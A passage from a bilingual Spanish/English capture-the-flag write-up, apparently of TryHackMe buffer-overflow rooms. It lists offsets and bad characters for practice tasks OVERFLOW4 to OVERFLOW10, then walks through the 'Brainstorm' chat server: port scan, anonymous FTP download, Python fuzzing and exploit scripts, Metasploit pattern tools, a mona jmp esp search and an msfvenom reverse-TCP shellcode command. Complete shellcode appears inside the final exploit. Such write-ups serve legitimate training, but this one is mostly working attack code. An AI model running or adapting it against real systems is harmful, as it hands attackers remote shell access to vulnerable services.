xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

De forma que repasamos el hexdump a partir del registro ESP y obtenemos que los badchars son: \\x00\\x11\\x40\\x5F\\xB8\\xEE.

De esta forma, con los badchars ya podríamos construir satisfactoriamente una shellcode y encontrar un puntero de salto al ESP (jmp esp) adecuado para crear un exploit que nos de acceso a la máquina.

<br />

**OVERFLOW4**

- *Fuzzing*: Fuzzeamos y nos informa de que el servicio crashea a los 2100 a través del comando OVERFLOW4.
- *Catching Offset*: Empleamos las herramientas de metasploit para crear un patrón de 2200 bytes y medimos el offset exacto desde el inicio con el término que queda sobreescrito el registro EIP. El EIP ha quedado sobreescrito con el término 70433570, que coincide con el offset: 2026.
- *BadCharacters*: Modificamos el exploit.py y Generamos un string de bytes en hexadecimal para enviarlo en el exploit después de la sobreescritura del EIP para buscar badchars. Obtenemos que estos son: \\x00\\xA9\\xCD\\xD4

<br />

**OVERFLOW5**

- *Fuzzing*: 400 bytes.
- *Offset*: 314
- *Badchars*: \\x00\\x16\\x2F\\xF4\\xFD

<br />

**OVERFLOW6**

- *Fuzzing*: 1100
- *Offset*: 1034
- *BadChars*: \\x00\\x08\\x2C\\xAD

<br />

**OVERFLOW7**

- *Fuzzing*: 1400
- *Offset*: 1306
- *BadChars*: \\x00\\x8C\\xAE\\xBE \\xFB

**OVERFLOW8**

- *Fuzzing*:1800
- *Offset*: 1786
- *BadChars*:\\x00\\x1D\\x2E\\xC7\\xEE

**OVERFLOW9**

- *Fuzzing*: 1600
- *Offset*: 1514
- *BadChars*: \\x00\\x04\\x3E\\x3F\\xE1

**OVERFLOW10**

- *Fuzzing*:
- *Offset*:
- *BadChars*:

<br />

#### 7.2. Brainstorm.

In this case we have a Windows Machine in which we are going to perfom a BufferOverFlow attack through a service. In first place we are going to prepare the attack *offline* downloading the executable that runs the service and then we are going to proceed online.

<br />

**Port Scanning**

In first place, we do a port scanning of the machine. The results shown that we have open at least 3 ports, 21 (ftp service), 3389 (RDP service, thus is a Windows machine), 9999 (with unknown service).

In subsequent scans (-A flag) we find that the anonymous user is allowed in the ftp service and that the service offered by the 9999 port is indeed a serverchat.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221031184427.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221031184450.png' | relative_url }}" text-align="center"/>
</div>

<br />

**FTP Service Enumeration**

Then, we proceed to use the FTP client to connect to the ftp server and explore it.

We log as anonymous user and deactive the *passive* mode and activate *ascii* mode to be able to receive the output of the comands that we send:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221031185441.png' | relative_url }}" text-align="center"/>
</div>

We found the *chatserver.exe* which is presumibly, the executable that initiate the service. Then, we proceed to download it in order to prepare a bufferoverflow attack.

For this, we activate the *binary* mode and 'get' the file from the ftp server:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221031185637.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Preparing Buffer Overflow attack**

Then, we have to transfer the executable file to an Windows VM that already have [Immunity Debugger](https://www.immunityinc.com/products/debugger/) and [Mona](https://github.com/corelan/mona) installed.

Once there, we use the following python code to *fuzz* the service:

```python
import socket, time, sys

ip = "10.0.2.4"
timeout = 5
string = "A" * 100

while True:
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.settimeout(timeout)
s.connect((ip,port))
s.recv(1024)
s.recv(1024)
s.send(b"name" + b'\r\n') #La b indica que se envía en forma de bytes, de otra forma no se podrá realizar el envío y se desencadenará un error. Además, \r\n hace que lo siguiente se envíe en una nueva línea.
s.recv(1024)
s.send(bytes(string,"latin-1")) #De nuevo volvemos a enviar el string de desbordamiento en bytes.
print("[+] Sended %s bytes"%format(len(string)))
s.recv(1024)
s.close()
except:
print("Service crashed at %s bytes"%format(len(string)))
sys.exit(0)
```

We have to note that, as the name can only contain 20 caracters it is only reasonable to test the 'message' command.

When use this code, the fuzz will start until the 2100 bytes:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221101180355.png' | relative_url }}" text-align="center"/>
</div>

Then, we take a look over the Immunity Debugger and we verify that the service crashed because a overwriting of the EIP registry and thus, the service is vulnerable to a BufferOverflow attack through the message command:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221101180710.png' | relative_url }}" text-align="center"/>
</div>

Then, we proceed to calculate exact offset. For this purpose we use the following code:

```python
import socket, sys, time
offset = 0
overflow = "A"*offset
retn = ""
padding = ""
payload = ""
postfix = ""
buffer = overflow + retn + padding + payload + postfix
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.connect(('10.0.2.4',9999))
s.recv(2048)
s.send(b"name" + b'\r\n')
s.recv(1024)
s.send(bytes(buffer,"latin-1"))
except:
print("[!] Cannot connect to the service.")
sys.exit(0)
```

With the code above, we generate a 2100 pattern with the comand below:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
```

And we include the output in the payload variable and execute the exploit.py. Thus, we can see in Immunity Debugger that the EIP registry has the term: 31704330, with the following command:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2100 -q 31704330
```

We found that the exact offset is 2012.

We can verify this by deleting the payload variable value on the exploit.py code and setting the 'offset' variable to 2012 and the 'retn' variable to "B"\*4. Then, we send again the exploit.py and if the EIP get overwrited with "42424242" (four 'B's in hex), then we done calculating the offset.

Now is time to found the badcaracters. For that, we want to send an string of hex chars next to the EIP overwritting to see how the shellcode is going to be treated by the program so we remain the offset and the retn values on the exploit.py code.

We employ the following python code:

```python
for x in range(1, 256):
print("\\x" + "{:02x}".format(x), end='')
print()
```

On the next command:

```bash
python3 badchars.py | tr -d '\n';echo
```

To receive a string of hex chars that we include in exploit.py on the payload variable.

```python
import socket, sys, time
offset = 2012
overflow = "A"*offset
retn = "B"*4
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""
buffer = overflow + retn + padding + payload + postfix
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.connect(('10.0.2.4',9999))
s.recv(2048)
s.send(b"name" + b'\r\n')
s.recv(1024)
s.send(bytes(buffer,"latin-1"))
except:
print("[!] Cannot connect to the service.")
sys.exit(0)
```

We send this code, and before the service crash, in Immunity Debugger we exam the hexdump of the ESP registry and take note over the bad chars. It appears that, except \\x00, the binary doesn't have any badchars.

Only remains to find a 'jmp esp' pointer that it can be achieve with the following mona command: *!mona jmp -r esp -cpb "\\x00"*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221101191013.png' | relative_url }}" text-align="center"/>
</div>

Then, we select the first one '625014df' and we include it in the 'retn' variable as hex chars on the reverse way:

```python
import socket, sys, time
offset = 2012
overflow = "A"*offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 16
payload = ""
postfix = ""
buffer = overflow + retn + padding + payload + postfix
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.connect(('10.0.2.4',9999))
s.recv(2048)
s.send(b"name" + b'\r\n')
s.recv(1024)
s.send(bytes(buffer,"latin-1"))
except:
print("[!] Cannot connect to the service.")
sys.exit(0)
```

Note that the padding variable only contains trash to separate the buffer overflow from the shellcode to guarantee a correct behaviour of the malware.

Last, with msfvenom we create a shellcode:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```

And we include the output on the payload variable:

```python
import socket, sys, time
offset = 2012
overflow = "A"*offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" *16
payload = ("\xda\xd0\xd9\x74\x24\xf4\x5d\x2b\xc9\xb8\x18\xb9\xbe\x48\xb1"
"\x52\x31\x45\x17\x83\xed\xfc\x03\x5d\xaa\x5c\xbd\xa1\x24\x22"
"\x3e\x59\xb5\x43\xb6\xbc\x84\x43\xac\xb5\xb7\x73\xa6\x9b\x3b"
"\xff\xea\x0f\xcf\x8d\x22\x20\x78\x3b\x15\x0f\x79\x10\x65\x0e"
"\xf9\x6b\xba\xf0\xc0\xa3\xcf\xf1\x05\xd9\x22\xa3\xde\x95\x91"
"\x53\x6a\xe3\x29\xd8\x20\xe5\x29\x3d\xf0\x04\x1b\x90\x8a\x5e"
"\xbb\x13\x5e\xeb\xf2\x0b\x83\xd6\x4d\xa0\x77\xac\x4f\x60\x46"
"\x4d\xe3\x4d\x66\xbc\xfd\x8a\x41\x5f\x88\xe2\xb1\xe2\x8b\x31"
"\xcb\x38\x19\xa1\x6b\xca\xb9\x0d\x8d\x1f\x5f\xc6\x81\xd4\x2b"
"\x80\x85\xeb\xf8\xbb\xb2\x60\xff\x6b\x33\x32\x24\xaf\x1f\xe0"
"\x45\xf6\xc5\x47\x79\xe8\xa5\x38\xdf\x63\x4b\x2c\x52\x2e\x04"
"\x81\x5f\xd0\xd4\x8d\xe8\xa3\xe6\x12\x43\x2b\x4b\xda\x4d\xac"
"\xac\xf1\x2a\x22\x53\xfa\x4a\x6b\x90\xae\x1a\x03\x31\xcf\xf0"
"\xd3\xbe\x1a\x56\x83\x10\xf5\x17\x73\xd1\xa5\xff\x99\xde\x9a"
"\xe0\xa2\x34\xb3\x8b\x59\xdf\xb6\x4b\x63\x10\xaf\x49\x63\x3f"
"\x73\xc7\x85\x55\x9b\x81\x1e\xc2\x02\x88\xd4\x73\xca\x06\x91"
"\xb4\x40\xa5\x66\x7a\xa1\xc0\x74\xeb\x41\x9f\x26\xba\x5e\x35"
"\x4e\x20\xcc\xd2\x8e\x2f\xed\x4c\xd9\x78\xc3\x84\x8f\x94\x7a"
"\x3f\xad\x64\x1a\x78\x75\xb3\xdf\x87\x74\x36\x5b\xac\x66\x8e"
"\x64\xe8\xd2\x5e\x33\xa6\x8c\x18\xed\x08\x66\xf3\x42\xc3\xee"
"\x82\xa8\xd4\x68\x8b\xe4\xa2\x94\x3a\x51\xf3\xab\xf3\x35\xf3"
"\xd4\xe9\xa5\xfc\x0f\xaa\xc6\x1e\x85\xc7\x6e\x87\x4c\x6a\xf3"
"\x38\xbb\xa9\x0a\xbb\x49\x52\xe9\xa3\x38\x57\xb5\x63\xd1\x25"
"\xa6\x01\xd5\x9a\xc7\x03")
postfix = ""
buffer = overflow + retn + padding + payload + postfix
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.connect(('10.0.2.4',9999))
s.recv(2048)
s.send(b"name" + b'\r\n')
s.recv(1024)
s.send(bytes(buffer,"latin-1"))
except:
print("[!] Cannot connect to the service.")
sys.exit(0)
```

Next to send the exploit, we gaing access in our WinVM machine:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221101192658.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Gaining Access**

Thus, we set up a netcat listener on the port 4444 and then launch the exploit.py and:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221101193558.png' | relative_url }}" text-align="center"/>
</div>

<br />

